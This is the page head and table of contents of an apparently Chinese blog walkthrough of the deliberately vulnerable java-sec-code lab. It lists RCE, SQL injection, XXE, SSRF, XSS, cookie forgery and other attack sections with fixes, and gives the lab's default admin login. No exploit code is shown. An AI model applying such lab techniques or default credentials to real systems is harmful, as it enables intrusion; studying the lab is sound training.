<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="kinsey"><meta name="copyright" content="kinsey"><meta name="generator" content="Hexo 7.2.0"><meta name="theme" content="hexo-theme-yun"><title>java-sec-code | 北歌</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="stylesheet" type="text/css" href="https://fastly.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script defer src="https://fastly.jsdelivr.net/npm/katex@latest/dist/katex.min.js"></script><link rel="stylesheet" type="text/css" href="https://fastly.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.min.css"><script defer src="https://fastly.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.min.js"></script><script defer src="https://fastly.jsdelivr.net/npm/katex@latest/dist/contrib/auto-render.min.js"></script><script type="module">import { renderKatex } from '/js/utils.js'
document.addEventListener("DOMContentLoaded", () => {
  renderKatex({
    ...{},
    ...undefined?.options,
  });
});</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"kinseyy.github.io","root":"/","title":"北沐城歌","version":"1.10.11","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"algolia":{"appID":"LWKPDLFKV6","apiKey":"6f230e5e2cdf36415bd02b48c1138c08","indexName":"my-hexo-blog","hits":{"per_page":8}},"fireworks":{"colors":null},"waline":{"config":{"enable":true,"serverURL":"https://kinsey-six.vercel.app","comment":true,"visitor":true,"emoji":["https://fastly.jsdelivr.net/gh/walinejs/emojis@latest/bilibili/","https://fastly.jsdelivr.net/gh/walinejs/emojis@latest/weibo/","https://fastly.jsdelivr.net/gh/walinejs/emojis@latest/qq/"],"locale":{"placeholder":"填写邮箱，可以收到回复通知哦～"},"requiredMeta":["nick"],"el":"#waline","lang":"en"},"cdn":"https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.js","dark":"html.dark"},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="北歌" type="application/atom+xml"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin><script async src="https://www.googletagmanager.com/gtag/js?id=G-1LL0D86CY9"></script><script>if (CONFIG.hostname === location.hostname) {
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'G-1LL0D86CY9');
}</script><script data-ad-client="ca-pub-2245427233262012" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><!-- Google Tag Manager --><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-M9KWR9L');</script><!-- End Google Tag Manager --><script>CONFIG.leancloudVisitors = {"enable":true,"app_id":"S8MhECl1Bg6fZt5ulKgIlajS-MdYXbMMI","app_key":"eLIsYKPJFnSJdwmHLoigqBR4","server_url":"https://s8mhecl1.api.lncldglobal.com"}</script><script defer src="/js/analytics/leancloud-visitors.js" type="module"></script><meta name="description" content="靶场需访问http:&#x2F;&#x2F;localhost:8080&#x2F;index 默认账号密码为admin admin123 题目在源码里（亏我找半天） 由于后面环境是docker开的，计算器可能弹不出来 RCE1. &#x2F;rce&#x2F;runtime&#x2F;exec12345678910111213141516171819202122232425262728@GetMapping(&quot;&#x2F;r">
<meta property="og:type" content="article">
<meta property="og:title" content="java-sec-code">
<meta property="og:url" content="https://kinseyy.github.io/2025/06/26/java-sec-code/index.html">
<meta property="og:site_name" content="北歌">
<meta property="og:description" content="靶场需访问http:&#x2F;&#x2F;localhost:8080&#x2F;index 默认账号密码为admin admin123 题目在源码里（亏我找半天） 由于后面环境是docker开的，计算器可能弹不出来 RCE1. &#x2F;rce&#x2F;runtime&#x2F;exec12345678910111213141516171819202122232425262728@GetMapping(&quot;&#x2F;r">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412062003249.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412062024910.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505222139928.png">
<meta property="og:image" content="c:/Users/11/AppData/Roaming/Typora/typora-user-images/image-20250525193848130.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505251952938.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252024745.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252035488.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252101651.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252101651.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252119621.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252145129.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272017990.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272053224.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272105083.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272132329.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272138857.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272146502.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505281929552.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505281948518.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507240850408.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251640728.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251643828.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251644303.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251712331.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281127895.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281443153.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281145386.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281417899.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281418084.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281439849.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281459171.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507291046226.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507291407579.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507301105109.png">
<meta property="article:published_time" content="2025-06-26T12:58:52.000Z">
<meta property="article:modified_time" content="2025-07-30T03:36:12.321Z">
<meta property="article:author" content="kinsey">
<meta property="article:tag" content="java">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412062003249.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="kinsey"><img width="96" loading="lazy" src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405312004243.jpeg" alt="kinsey"><span class="site-author-status" title="Looking for dawn.">🌑</span></a><div class="site-author-name"><a href="/about/">kinsey</a></div><span class="site-name">北歌</span><sub class="site-subtitle"></sub><div class="site-description"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">220</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">7</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">101</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="留言板"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:clipboard-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange"><span class="icon iconify" data-icon="ri:rss-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/kinseyy" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=3954596483" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://travellings.link" title="Travelling" target="_blank" style="color:var(--hty-text-color)"><span class="icon iconify" data-icon="ri:train-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a><a class="links-item hty-icon-button" href="/girls/" title="喜欢的女孩子" style="color:hotpink"><span class="icon iconify" data-icon="ri:women-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE"><span class="toc-number">1.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-rce-runtime-exec"><span class="toc-number">1.1.</span> <span class="toc-text">1. &#x2F;rce&#x2F;runtime&#x2F;exec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-rce-ProcessBuilder"><span class="toc-number">1.2.</span> <span class="toc-text">2.&#x2F;rce&#x2F;ProcessBuilder</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-rce-jscmd"><span class="toc-number">1.3.</span> <span class="toc-text">3.&#x2F;rce&#x2F;jscmd</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-rce-vuln-yarm"><span class="toc-number">1.4.</span> <span class="toc-text">4.&#x2F;rce&#x2F;vuln&#x2F;yarm</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-rce-groovy"><span class="toc-number">1.5.</span> <span class="toc-text">5.&#x2F;rce&#x2F;groovy</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-sqli-jdbc-vuln"><span class="toc-number">2.1.</span> <span class="toc-text">1.&#x2F;sqli&#x2F;jdbc&#x2F;vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-sqli-jdbc-ps-vuln"><span class="toc-number">2.2.</span> <span class="toc-text">2.&#x2F;sqli&#x2F;jdbc&#x2F;ps&#x2F;vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-sqli-mybatis-vuln01"><span class="toc-number">2.3.</span> <span class="toc-text">3.&#x2F;sqli&#x2F;mybatis&#x2F;vuln01</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-sqli-mybatis-vuln02"><span class="toc-number">2.4.</span> <span class="toc-text">4.&#x2F;sqli&#x2F;mybatis&#x2F;vuln02</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-sqli-mybatis-orderby-vuln03"><span class="toc-number">2.5.</span> <span class="toc-text">5.&#x2F;sqli&#x2F;mybatis&#x2F;orderby&#x2F;vuln03</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E4%BF%AE%E5%A4%8D%E4%B8%8E%E9%98%B2%E6%8A%A4"><span class="toc-number">2.6.</span> <span class="toc-text">sql注入修复与防护</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSTI"><span class="toc-number">3.</span> <span class="toc-text">SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ssti-velocity"><span class="toc-number">3.1.</span> <span class="toc-text">&#x2F;ssti&#x2F;velocity</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF"><span class="toc-number">4.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-ssrf-urlConnection-vuln"><span class="toc-number">4.1.</span> <span class="toc-text">1.&#x2F;ssrf&#x2F;urlConnection&#x2F;vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-ssrf-HttpURLConnection-vuln"><span class="toc-number">4.2.</span> <span class="toc-text">2.&#x2F;ssrf&#x2F;HttpURLConnection&#x2F;vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-ssrf-openStream"><span class="toc-number">4.3.</span> <span class="toc-text">3.&#x2F;ssrf&#x2F;openStream</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-ssrf-HttpSyncClients-vuln"><span class="toc-number">4.4.</span> <span class="toc-text">4.&#x2F;ssrf&#x2F;HttpSyncClients&#x2F;vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-ssrf-restTemplate-vuln1"><span class="toc-number">4.5.</span> <span class="toc-text">5.&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-ssrf-restTemplate-vuln2"><span class="toc-number">4.6.</span> <span class="toc-text">6.&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-ssrf-hutool-vuln"><span class="toc-number">4.7.</span> <span class="toc-text">7.&#x2F;ssrf&#x2F;hutool&#x2F;vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-ssrf-dnsrebind-vuln"><span class="toc-number">4.8.</span> <span class="toc-text">8.&#x2F;ssrf&#x2F;dnsrebind&#x2F;vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ssrf%E7%9A%84%E4%BF%AE%E5%A4%8D%E4%B8%8E%E9%98%B2%E6%8A%A4"><span class="toc-number">4.9.</span> <span class="toc-text">ssrf的修复与防护</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF"><span class="toc-number">5.</span> <span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-csrf-post"><span class="toc-number">5.1.</span> <span class="toc-text">1.&#x2F;csrf&#x2F;post</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#csrf%E7%9A%84%E9%98%B2%E6%8A%A4"><span class="toc-number">5.2.</span> <span class="toc-text">csrf的防护</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS"><span class="toc-number">6.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-xss-reflect"><span class="toc-number">6.1.</span> <span class="toc-text">1.&#x2F;xss&#x2F;reflect</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-xss-stored"><span class="toc-number">6.2.</span> <span class="toc-text">2.&#x2F;xss&#x2F;stored</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xss%E9%98%B2%E6%8A%A4"><span class="toc-number">6.3.</span> <span class="toc-text">xss防护</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE"><span class="toc-number">7.</span> <span class="toc-text">XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-xxe-xmlReader-vuln"><span class="toc-number">7.1.</span> <span class="toc-text">1.&#x2F;xxe&#x2F;xmlReader&#x2F;vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-xxe-SAXBuilder-vuln"><span class="toc-number">7.2.</span> <span class="toc-text">2.&#x2F;xxe&#x2F;SAXBuilder&#x2F;vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E4%BB%A3%E7%A0%81"><span class="toc-number">7.3.</span> <span class="toc-text">修复代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-xxe-SAXReader-vuln"><span class="toc-number">7.4.</span> <span class="toc-text">3.&#x2F;xxe&#x2F;SAXReader&#x2F;vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-xxe-SAXParser-vuln"><span class="toc-number">7.5.</span> <span class="toc-text">4.&#x2F;xxe&#x2F;SAXParser&#x2F;vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-xxe-Digester-vuln"><span class="toc-number">7.6.</span> <span class="toc-text">5.&#x2F;xxe&#x2F;Digester&#x2F;vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-xxe-DocumentBuilder-vuln"><span class="toc-number">7.7.</span> <span class="toc-text">6.&#x2F;xxe&#x2F;DocumentBuilder&#x2F;vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-xxe-DocumentBuilder-xinclude-vuln"><span class="toc-number">7.8.</span> <span class="toc-text">7.&#x2F;xxe&#x2F;DocumentBuilder&#x2F;xinclude&#x2F;vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-xxe-XMLReader-vuln"><span class="toc-number">7.9.</span> <span class="toc-text">8.&#x2F;xxe&#x2F;XMLReader&#x2F;vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-xxe-DocumentHelper-vuln"><span class="toc-number">7.10.</span> <span class="toc-text">9.&#x2F;xxe&#x2F;DocumentHelper&#x2F;vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E8%BF%B0%E5%AD%98%E5%9C%A8XXE%E6%BC%8F%E6%B4%9E%E5%BA%93%E5%AF%B9%E6%AF%94"><span class="toc-number">7.11.</span> <span class="toc-text">上述存在XXE漏洞库对比</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%9F%E4%B8%80%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8payload"><span class="toc-number">7.12.</span> <span class="toc-text">统一漏洞利用payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%9F%E4%B8%80%E4%BF%AE%E5%A4%8D%E4%BB%A3%E7%A0%81"><span class="toc-number">7.13.</span> <span class="toc-text">统一修复代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10-xxe-xmlbeam-vuln"><span class="toc-number">7.14.</span> <span class="toc-text">10.&#x2F;xxe&#x2F;xmlbeam&#x2F;vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#11-ooxml-readxlsx"><span class="toc-number">7.15.</span> <span class="toc-text">11&#x2F;ooxml&#x2F;readxlsx</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#12-xlsx-streamer-readxlsx"><span class="toc-number">7.16.</span> <span class="toc-text">12.&#x2F;xlsx-streamer&#x2F;readxlsx</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Commandinject"><span class="toc-number">8.</span> <span class="toc-text">Commandinject</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-codeinject"><span class="toc-number">8.1.</span> <span class="toc-text">1.&#x2F;codeinject</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-codeinject-host"><span class="toc-number">8.2.</span> <span class="toc-text">2.&#x2F;codeinject&#x2F;host</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">8.3.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie%E4%BC%AA%E9%80%A0"><span class="toc-number">9.</span> <span class="toc-text">Cookie伪造</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-cookie-vuln01"><span class="toc-number">9.1.</span> <span class="toc-text">1.&#x2F;cookie&#x2F;vuln01</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-cookie-vuln02"><span class="toc-number">9.2.</span> <span class="toc-text">2.&#x2F;cookie&#x2F;vuln02</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-cookie-vuln03"><span class="toc-number">9.3.</span> <span class="toc-text">3.&#x2F;cookie&#x2F;vuln03</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-cookie-vuln04"><span class="toc-number">9.4.</span> <span class="toc-text">4.&#x2F;cookie&#x2F;vuln04</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-cookie-vuln05"><span class="toc-number">9.5.</span> <span class="toc-text">5.&#x2F;cookie&#x2F;vuln05</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-cookie-vuln06"><span class="toc-number">9.6.</span> <span class="toc-text">6.&#x2F;cookie&#x2F;vuln06</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">9.7.</span> <span class="toc-text">漏洞利用.</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CORS"><span class="toc-number">10.</span> <span class="toc-text">CORS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">10.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-cors-vuln-origin"><span class="toc-number">10.2.</span> <span class="toc-text">1.&#x2F;cors&#x2F;vuln&#x2F;origin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-cors-vuln-setHeader"><span class="toc-number">10.3.</span> <span class="toc-text">2.&#x2F;cors&#x2F;vuln&#x2F;setHeader</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-cors-vuln-crossOrigin"><span class="toc-number">10.4.</span> <span class="toc-text">3.&#x2F;cors&#x2F;vuln&#x2F;crossOrigin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-number">10.5.</span> <span class="toc-text">漏洞验证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1"><span class="toc-number">10.6.</span> <span class="toc-text">漏洞防御</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E9%99%90%E5%88%B6origin"><span class="toc-number">10.6.1.</span> <span class="toc-text">（1）限制origin</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%882%EF%BC%89WebMvcConfigurer%E8%AE%BE%E7%BD%AECors"><span class="toc-number">10.6.2.</span> <span class="toc-text">（2）WebMvcConfigurer设置Cors</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%883%EF%BC%89spring-security%E8%AE%BE%E7%BD%AEcors"><span class="toc-number">10.6.3.</span> <span class="toc-text">（3）spring security设置cors</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%884%EF%BC%89%E8%87%AA%E5%AE%9A%E4%B9%89filter%E8%AE%BE%E7%BD%AEcors"><span class="toc-number">10.6.4.</span> <span class="toc-text">（4）自定义filter设置cors</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%885%EF%BC%89CorsFilter%E8%AE%BE%E7%BD%AEcors"><span class="toc-number">10.6.5.</span> <span class="toc-text">（5）CorsFilter设置cors</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%886%EF%BC%89origin%E6%A3%80%E6%9F%A5"><span class="toc-number">10.6.6.</span> <span class="toc-text">（6）origin检查</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-number">11.</span> <span class="toc-text">目录遍历</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-path-traversal-vul"><span class="toc-number">11.1.</span> <span class="toc-text">1.&#x2F;path_traversal&#x2F;vul</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">12.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-file-upload"><span class="toc-number">12.1.</span> <span class="toc-text">1.&#x2F;file&#x2F;upload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">13.</span> <span class="toc-text">SpEL表达式注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-spel-vuln1"><span class="toc-number">13.1.</span> <span class="toc-text">1.&#x2F;spel&#x2F;vuln1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-spel-vuln2"><span class="toc-number">13.2.</span> <span class="toc-text">2.&#x2F;spel&#x2F;vuln2</span></a></li><li class="toc-item toc-level-4"><a 